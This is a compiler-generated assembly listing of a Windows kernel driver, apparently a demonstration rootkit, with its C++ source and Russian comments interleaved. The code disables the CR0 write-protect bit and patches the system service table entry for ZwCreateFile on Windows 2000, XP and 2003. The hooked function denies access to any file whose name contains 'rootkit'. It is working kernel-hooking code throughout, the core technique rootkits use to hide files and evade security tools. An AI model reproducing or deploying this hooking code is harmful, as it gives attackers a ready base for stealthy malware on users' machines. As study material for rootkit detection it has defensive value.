; Listing generated by Microsoft (R) Optimizing Compiler Version 13.10.3077 

	TITLE	.\rkdrv.cpp
	.386P
include listing.inc
if @Version gt 510
.model FLAT
else
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
_BSS	SEGMENT DWORD USE32 PUBLIC 'BSS'
_BSS	ENDS
$$SYMBOLS	SEGMENT BYTE USE32 'DEBSYM'
$$SYMBOLS	ENDS
_TLS	SEGMENT DWORD USE32 PUBLIC 'TLS'
_TLS	ENDS
;	COMDAT ??_C@_05OJIGFHBO@?$CFws?5?6?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?SetKiSTHook@@YGXXZ
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DeleteKiSTHook@@YGXXZ
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
FLAT	GROUP _DATA, CONST, _BSS
	ASSUME	CS: FLAT, DS: FLAT, SS: FLAT
endif

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?gpDeviceObject@@3PAU_DEVICE_OBJECT@@A		; gpDeviceObject
PUBLIC	?gpDeviceContext@@3PAU_DEVICE_CONTEXT@@A	; gpDeviceContext
PUBLIC	?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA ; OldZwCreateFile
_BSS	SEGMENT
?gpDeviceObject@@3PAU_DEVICE_OBJECT@@A DD 01H DUP (?)	; gpDeviceObject
?gpDeviceContext@@3PAU_DEVICE_CONTEXT@@A DD 01H DUP (?)	; gpDeviceContext
?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA DD 01H DUP (?) ; OldZwCreateFile
_BSS	ENDS
PUBLIC	?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ; MyZwCreateFile
PUBLIC	??_C@_05OJIGFHBO@?$CFws?5?6?$AA@		; `string'
PUBLIC	??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@ ; `string'
PUBLIC	??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@ ; `string'
EXTRN	_wcsstr:NEAR
EXTRN	_DbgPrint:NEAR
;	COMDAT ??_C@_05OJIGFHBO@?$CFws?5?6?$AA@
; File e:\delphi5\delphi7\projects\bhv\rkkm1\rkdrv.cpp
CONST	SEGMENT
??_C@_05OJIGFHBO@?$CFws?5?6?$AA@ DB '%ws ', 0aH, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
CONST	SEGMENT
??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@ DB 'r', 00H
	DB	'o', 00H, 'o', 00H, 't', 00H, 'k', 00H, 'i', 00H, 't', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@
CONST	SEGMENT
??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@ DB 'Lock file !!!!'
	DB	0aH, 00H					; `string'
; Function compile flags: /Ogty
CONST	ENDS
;	COMDAT ?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z
_TEXT	SEGMENT
_FileHandle$ = 8					; size = 4
_DesiredAccess$ = 12					; size = 4
_ObjectAttributes$ = 16					; size = 4
_IoStatusBlock$ = 20					; size = 4
_AllocationSize$ = 24					; size = 4
_FileAttributes$ = 28					; size = 4
_ShareAccess$ = 32					; size = 4
_CreateDisposition$ = 36				; size = 4
_CreateOptions$ = 40					; size = 4
_EaBuffer$ = 44						; size = 4
_EaLength$ = 48						; size = 4
?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z PROC NEAR ; MyZwCreateFile, COMDAT

; 52   : {

	push	esi

; 53   :  
; 54   :    DbgPrint("%ws \n", ObjectAttributes->ObjectName->Buffer);

	mov	esi, DWORD PTR _ObjectAttributes$[esp]
	mov	eax, DWORD PTR [esi+8]
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	push	OFFSET FLAT:??_C@_05OJIGFHBO@?$CFws?5?6?$AA@
	call	_DbgPrint

; 55   :    // Блокировка доступа к файлу, содержащему строку "rootkit"
; 56   :    if (wcsstr(ObjectAttributes->ObjectName->Buffer, L"rootkit") != NULL) {

	mov	edx, DWORD PTR [esi+8]
	mov	eax, DWORD PTR [edx+4]
	push	OFFSET FLAT:??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
	push	eax
	call	_wcsstr
	add	esp, 16					; 00000010H
	test	eax, eax
	je	SHORT $L9947

; 57   : 	   DbgPrint("Lock file !!!!\n");

	push	OFFSET FLAT:??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@
	call	_DbgPrint
	add	esp, 4

; 58   : 	   return STATUS_ACCESS_DENIED;

	mov	eax, -1073741790			; c0000022H
	pop	esi

; 64   : }

	ret	44					; 0000002cH
$L9947:

; 59   :    }
; 60   :  // Вызов исходной функции
; 61   :  return OldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, 
; 62   : 	  IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
; 63   : 	  CreateDisposition, CreateOptions, EaBuffer, EaLength);

	mov	ecx, DWORD PTR _EaLength$[esp]
	mov	edx, DWORD PTR _EaBuffer$[esp]
	mov	eax, DWORD PTR _CreateOptions$[esp]
	push	ecx
	mov	ecx, DWORD PTR _CreateDisposition$[esp+4]
	push	edx
	mov	edx, DWORD PTR _ShareAccess$[esp+8]
	push	eax
	mov	eax, DWORD PTR _FileAttributes$[esp+12]
	push	ecx
	mov	ecx, DWORD PTR _AllocationSize$[esp+16]
	push	edx
	mov	edx, DWORD PTR _IoStatusBlock$[esp+20]
	push	eax
	mov	eax, DWORD PTR _DesiredAccess$[esp+24]
	push	ecx
	mov	ecx, DWORD PTR _FileHandle$[esp+28]
	push	edx
	push	esi
	push	eax
	push	ecx
	call	DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA ; OldZwCreateFile
	pop	esi

; 64   : }

	ret	44					; 0000002cH
?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ENDP ; MyZwCreateFile
_TEXT	ENDS
PUBLIC	?SetKiSTHook@@YGXXZ				; SetKiSTHook
EXTRN	_KeServiceDescriptorTable:DWORD
EXTRN	_NtBuildNumber:DWORD
EXTRN	__imp_@KfLowerIrql@4:NEAR
EXTRN	__imp__KeRaiseIrqlToDpcLevel@0:NEAR
; Function compile flags: /Ogty
;	COMDAT ?SetKiSTHook@@YGXXZ
_TEXT	SEGMENT
_OldCR0$ = -4						; size = 4
?SetKiSTHook@@YGXXZ PROC NEAR				; SetKiSTHook, COMDAT

; 67   : {

	push	ecx

; 68   :  DWORD OldCR0;	
; 69   :   
; 70   :  // Повышение приоритета
; 71   :  KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 

	call	DWORD PTR __imp__KeRaiseIrqlToDpcLevel@0
	mov	cl, al

; 72   :  
; 73   :  // Сброс WP бита
; 74   : _asm {
; 75   :     mov eax,CR0 

	mov	eax, cr0

; 76   :     mov OldCR0,eax

	mov	DWORD PTR _OldCR0$[esp+4], eax

; 77   :     and eax,0xFFFEFFFF			

	and	eax, -65537				; fffeffffH

; 78   :     mov cr0, eax

	mov	cr0, eax

; 79   :  }
; 80   : 	
; 81   :  switch (*NtBuildNumber) {

	mov	eax, DWORD PTR _NtBuildNumber
	movzx	eax, WORD PTR [eax]
	cmp	eax, 2195				; 00000893H
	je	SHORT $L9959
	cmp	eax, 2600				; 00000a28H
	je	SHORT $L9962
	cmp	eax, 3790				; 00000eceH
	jne	SHORT $L9956

; 90   :   case 3790:  // W2K3
; 91   :      OldZwCreateFile = (PZwCreateFile)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27];

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	edx, DWORD PTR [edx+156]
	mov	DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA, edx ; OldZwCreateFile

; 92   : 	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27]   = (NTPROC)*MyZwCreateFile;

	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [eax+156], OFFSET FLAT:?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ; MyZwCreateFile

; 93   : 	 break;

	jmp	SHORT $L9956
$L9962:

; 85   : 	 break;
; 86   :   case 2600:   // Win XP
; 87   :      OldZwCreateFile = (PZwCreateFile)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25];

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	edx, DWORD PTR [edx+148]
	mov	DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA, edx ; OldZwCreateFile

; 88   : 	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25]   = (NTPROC)*MyZwCreateFile;

	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [eax+148], OFFSET FLAT:?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ; MyZwCreateFile

; 89   : 	 break;

	jmp	SHORT $L9956
$L9959:

; 82   :   case  2195:  // Win 2k
; 83   :      OldZwCreateFile = (PZwCreateFile)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20];

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	edx, DWORD PTR [edx+128]
	mov	DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA, edx ; OldZwCreateFile

; 84   : 	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20]   = (NTPROC)*MyZwCreateFile;

	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [eax+128], OFFSET FLAT:?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ; MyZwCreateFile
$L9956:

; 94   : }
; 95   : 
; 96   :  // Восстановление WP бита
; 97   :  _asm {
; 98   : 	 mov eax,OldCR0		

	mov	eax, DWORD PTR _OldCR0$[esp+4]

; 99   :      mov cr0,eax

	mov	cr0, eax

; 103  : }

	add	esp, 4

; 100  :  }
; 101  :  // Восстановление приоритета
; 102  :  KeLowerIrql(OldIRQL);

	jmp	DWORD PTR __imp_@KfLowerIrql@4
?SetKiSTHook@@YGXXZ ENDP				; SetKiSTHook
_TEXT	ENDS
PUBLIC	?DeleteKiSTHook@@YGXXZ				; DeleteKiSTHook
; Function compile flags: /Ogty
;	COMDAT ?DeleteKiSTHook@@YGXXZ
_TEXT	SEGMENT
_OldCR0$ = -4						; size = 4
?DeleteKiSTHook@@YGXXZ PROC NEAR			; DeleteKiSTHook, COMDAT

; 107  : {

	push	ecx

; 108  :  DWORD OldCR0;	
; 109  :   
; 110  :  // Повышение приоритета
; 111  :  KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 

	call	DWORD PTR __imp__KeRaiseIrqlToDpcLevel@0
	mov	cl, al

; 112  :  
; 113  :  // Сброс WP бита
; 114  : _asm {
; 115  :     mov eax,CR0 

	mov	eax, cr0

; 116  :     mov OldCR0,eax

	mov	DWORD PTR _OldCR0$[esp+4], eax

; 117  :     and eax,0xFFFEFFFF			

	and	eax, -65537				; fffeffffH

; 118  :     mov cr0, eax

	mov	cr0, eax

; 119  :  }
; 120  : 	
; 121  :  switch (*NtBuildNumber) {

	mov	eax, DWORD PTR _NtBuildNumber
	movzx	eax, WORD PTR [eax]
	cmp	eax, 2195				; 00000893H
	je	SHORT $L9976
	cmp	eax, 2600				; 00000a28H
	je	SHORT $L9978
	cmp	eax, 3790				; 00000eceH
	jne	SHORT $L9973

; 128  :   case 3790:  // W2K3
; 129  :      KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27] = (NTPROC)*OldZwCreateFile;	 

	mov	edx, DWORD PTR _KeServiceDescriptorTable
	mov	eax, DWORD PTR [edx]
	mov	edx, DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA ; OldZwCreateFile
	mov	DWORD PTR [eax+156], edx

; 130  : 	 break;

	jmp	SHORT $L9973
$L9978:

; 124  : 	 break;
; 125  :   case 2600:   // Win XP
; 126  :      KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25] = (NTPROC)*OldZwCreateFile;	 

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [eax]
	mov	eax, DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA ; OldZwCreateFile
	mov	DWORD PTR [edx+148], eax

; 127  : 	 break;

	jmp	SHORT $L9973
$L9976:

; 122  :   case  2195:  // Win 2k
; 123  :      KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20] = (NTPROC)*OldZwCreateFile;	 

	mov	edx, DWORD PTR _KeServiceDescriptorTable
	mov	eax, DWORD PTR [edx]
	mov	edx, DWORD PTR ?OldZwCreateFile@@3P6GJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@ZA ; OldZwCreateFile
	mov	DWORD PTR [eax+128], edx
$L9973:

; 131  : }
; 132  : 
; 133  :  // Восстановление WP бита
; 134  :  _asm {
; 135  : 	 mov eax,OldCR0		

	mov	eax, DWORD PTR _OldCR0$[esp+4]

; 136  :      mov cr0,eax

	mov	cr0, eax

; 140  : }

	add	esp, 4

; 137  :  }
; 138  :  // Восстановление приоритета
; 139  :  KeLowerIrql(OldIRQL);

	jmp	DWORD PTR __imp_@KfLowerIrql@4
?DeleteKiSTHook@@YGXXZ ENDP				; DeleteKiSTHook
_TEXT	ENDS
PUBLIC	?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z		; DriverUnload
; Function compile flags: /Ogty
;	COMDAT ?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z PROC NEAR	; DriverUnload, COMDAT

; 146  :  DeleteKiSTHook();

	call	?DeleteKiSTHook@@YGXXZ			; DeleteKiSTHook

; 147  :  return;
; 148  : }

	ret	4
?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z ENDP		; DriverUnload
_TEXT	ENDS
PUBLIC	?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ; DriverEntry
; Function compile flags: /Ogty
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
_pusRegistryPath$ = 12					; size = 4
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z PROC NEAR ; DriverEntry, COMDAT

; 153  : 	NTSTATUS          InitRes = STATUS_SUCCESS;	
; 154  : 	SetKiSTHook();

	call	?SetKiSTHook@@YGXXZ			; SetKiSTHook

; 155  :     // Подключение обработчика выгрузки драйвера
; 156  :     pDriverObject->DriverUnload  = DriverUnload;

	mov	eax, DWORD PTR _pDriverObject$[esp-4]
	mov	DWORD PTR [eax+52], OFFSET FLAT:?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z ; DriverUnload

; 157  : 	// Возврат результата инициализации
; 158  :     return InitRes;

	xor	eax, eax

; 159  : }

	ret	8
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ENDP ; DriverEntry
_TEXT	ENDS
END
